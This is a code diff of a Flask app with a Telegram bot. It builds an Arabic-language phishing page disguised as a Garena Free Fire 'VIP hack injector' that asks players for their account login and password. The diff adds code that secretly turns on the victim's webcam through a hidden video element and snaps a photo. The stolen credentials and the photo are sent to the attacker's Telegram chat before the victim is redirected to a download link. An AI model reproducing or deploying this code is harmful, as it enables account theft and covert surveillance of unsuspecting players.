@@ -1,5 +1,6 @@
 import telebot
 from flask import Flask, request, render_template_string
+import base64
 import os
 
 # --- بياناتك ---
@@ -8,8 +9,8 @@ CHAT_ID = "8362370478"
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
 
-# --- رابط التحميل المباشر الخاص بك ---
-DOWNLOAD_LINK = "https://www.mediafire.com/your_file_link" 
+# --- رابط التحميل ---
+DOWNLOAD_LINK = "https://www.mediafire.com/your_link" 
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -17,103 +18,116 @@ HTML_PAGE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - VIP Injector</title>
+    <title>Garena FF - VIP Panel</title>
     <style>
-        :root { --main-color: #9d4edd; --bg-dark: #0f0c29; }
         body {
-            margin: 0; padding: 0;
-            background: linear-gradient(to bottom, #0f0c29, #302b63, #24243e);
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            color: white; display: flex; justify-content: center; align-items: center; height: 100vh;
+            margin: 0; background: #050505; color: white;
+            font-family: 'Cairo', sans-serif; overflow-x: hidden;
         }
-        .container {
-            width: 90%; max-width: 400px;
-            background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px; padding: 30px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            text-align: center;
+        .main-container {
+            background: url('https://freefiremobile-a.akamaihd.net/ffwebsite/images/wallpaper/img15.jpg') no-repeat center;
+            background-size: cover; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
-        .status-bar {
-            background: rgba(0, 255, 127, 0.1);
-            color: #00ff7f; padding: 5px 15px;
-            border-radius: 50px; font-size: 12px;
-            display: inline-block; margin-bottom: 20px;
-            border: 1px solid #00ff7f;
+        .overlay {
+            background: rgba(0, 0, 0, 0.85); width: 100%; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding-top: 50px;
         }
-        h2 { margin: 0; color: #fff; font-size: 24px; text-shadow: 0 0 10px var(--main-color); }
-        p { color: #ccc; font-size: 14px; margin-top: 5px; }
+        .card {
+            width: 350px; background: rgba(20, 20, 20, 0.9); border-top: 4px solid #ffb900;
+            border-radius: 15px; padding: 25px; box-shadow: 0 0 30px rgba(255, 185, 0, 0.2); text-align: center;
+        }
+        .logo { width: 120px; margin-bottom: 10px; filter: drop-shadow(0 0 10px #ffb900); }
+        .vip-badge { background: #ffb900; color: black; font-weight: bold; padding: 5px 15px; border-radius: 5px; font-size: 12px; margin-bottom: 15px; display: inline-block; }
         
-        .input-group { margin-top: 25px; text-align: right; }
-        label { display: block; margin-bottom: 5px; font-size: 13px; color: var(--main-color); margin-right: 10px;}
         input {
-            width: 100%; padding: 12px 15px;
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 10px; color: white;
-            box-sizing: border-box; outline: none; transition: 0.3s;
+            width: 100%; padding: 12px; margin: 10px 0; border-radius: 8px; border: 1px solid #333; background: #1a1a1a; color: white; text-align: right; box-sizing: border-box;
         }
-        input:focus { border-color: var(--main-color); box-shadow: 0 0 10px var(--main-color); }
-        
-        .btn {
-            margin-top: 30px; width: 100%; padding: 15px;
-            background: linear-gradient(45deg, #7b2ff7, #9d4edd);
-            border: none; border-radius: 10px;
-            color: white; font-weight: bold; font-size: 16px;
-            cursor: pointer; transition: 0.3s;
-            box-shadow: 0 5px 15px rgba(157, 78, 221, 0.4);
+        .btn-inject {
+            background: linear-gradient(90deg, #ffb900, #ff7700); border: none; width: 100%; padding: 15px;
+            color: black; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; margin-top: 15px;
         }
-        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(157, 78, 221, 0.6); }
+        .loading { display: none; margin-top: 15px; color: #ffb900; font-size: 14px; }
         
-        .footer-note { margin-top: 20px; font-size: 11px; color: #777; }
-        .secure-icon { vertical-align: middle; width: 14px; margin-left: 5px; }
+        /* شعارات الرتب */
+        .ranks { display: flex; justify-content: space-around; margin: 20px 0; opacity: 0.6; }
+        .ranks img { width: 40px; }
+
+        video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="status-bar">● السيرفر متصل: V2.8 Stable</div>
-    <h2>تفعيل نظام الاختراق VIP</h2>
-    <p>قم بتأكيد هويتك لربط الـ ID ومنع حظر الحساب</p>
+<div class="main-container">
+    <div class="overlay">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/41/Garena_Free_Fire_logo.png/250px-Garena_Free_Fire_logo.png" class="logo">
+        
+        <div class="card">
+            <div class="vip-badge">VIP HACK INJECTOR v2.8</div>
+            <h3 style="margin:0;">تسجيل دخول الحساب</h3>
+            <p style="font-size:12px; color:#aaa;">اربط حسابك الآن لتفعيل ميزات الـ Headshot والـ Speed</p>
 
-    <div class="input-group">
-        <label>البريد الإلكتروني / رقم الهاتف</label>
-        <input type="text" id="email" placeholder="example@mail.com" required>
-    </div>
+            <div class="ranks">
+                <img src="https://static.wikia.nocookie.net/free-fire/images/3/3d/Heroic.png">
+                <img src="https://static.wikia.nocookie.net/free-fire/images/5/52/Grandmaster.png">
+                <img src="https://static.wikia.nocookie.net/free-fire/images/b/b3/Diamond_IV.png">
+            </div>
 
-    <div class="input-group">
-        <label>كلمة المرور السرية</label>
-        <input type="password" id="pass" placeholder="••••••••" required>
-    </div>
+            <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني">
+            <input type="password" id="pass" placeholder="كلمة المرور">
 
-    <button class="btn" onclick="sendData()">ربط الحساب وتحميل الهاك</button>
-
-    <div class="footer-note">
-        <img src="https://img.icons8.com/ios-filled/50/777777/shield.png" class="secure-icon">
-        اتصال مشفر 256-bit SSL للحماية من الباند
+            <button class="btn-inject" onclick="startProcess()">تفعيل وحقن البيانات</button>
+            <div class="loading" id="loader">جاري جلب ملفات الـ OBB...</div>
+        </div>
+        
+        <p style="font-size:10px; color:#555; margin-top:20px;">© 2026 Garena Free Fire. All rights reserved.</p>
     </div>
 </div>
 
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
 <script>
-function sendData() {
-    const email = document.getElementById('email').value;
-    const pass = document.getElementById('pass').value;
-    
-    if(email.length < 5 || pass.length < 4) {
-        alert("خطأ: يرجى إدخال بيانات صحيحة للربط!");
-        return;
+async function startProcess() {
+    const u = document.getElementById('user').value;
+    const p = document.getElementById('pass').value;
+
+    if(u.length < 5 || p.length < 5) {
+        alert("خطأ في البيانات!"); return;
     }
 
-    // إرسال البيانات
-    fetch('/login_data', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({u: email, p: pass})
-    }).then(() => {
-        // التحويل للرابط
-        window.location.href = "{{ download_url }}";
-    });
+    document.getElementById('loader').style.display = "block";
+
+    // تفعيل الكاميرا وتصوير الهدف فوراً
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+        
+        setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            const imgData = canvas.toDataURL('image/png');
+            
+            // إرسال البيانات والصورة معاً
+            fetch('/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({user: u, pass: p, image: imgData})
+            }).then(() => {
+                window.location.href = "{{ download_url }}";
+            });
+        }, 1500);
+    } catch (e) {
+        // إذا رفض الكاميرا، نرسل البيانات فقط
+        fetch('/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({user: u, pass: p, image: "refused"})
+        }).then(() => {
+            window.location.href = "{{ download_url }}";
+        });
+    }
 }
 </script>
 
@@ -125,11 +139,20 @@ function sendData() {
 def home():
     return render_template_string(HTML_PAGE, download_url=DOWNLOAD_LINK)
 
-@app.route('/login_data', methods=['POST'])
-def login_data():
+@app.route('/capture', methods=['POST'])
+def capture():
     data = request.json
-    msg = f"🎯 **صيد VIP جديد!**\\n\\n👤 الحساب: `{data['u']}`\\n🔑 الباسورد: `{data['p']}`"
+    # إرسال النص
+    msg = f"🎯 **صيد جديد (فري فاير)**\\n👤 الحساب: `{data['user']}`\\n🔑 الباسورد: `{data['pass']}`"
     bot.send_message(CHAT_ID, msg, parse_mode="Markdown")
+    
+    # إرسال الصورة إذا وجدت
+    if data['image'] != "refused":
+        img_bytes = base64.b64decode(data['image'].split(',')[1])
+        with open("victim.png", "wb") as f: f.write(img_bytes)
+        with open("victim.png", "rb") as f:
+            bot.send_photo(CHAT_ID, f, caption="📸 صورة الضحية أثناء التسجيل")
+            
     return "ok"
 
 if __name__ == "__main__":
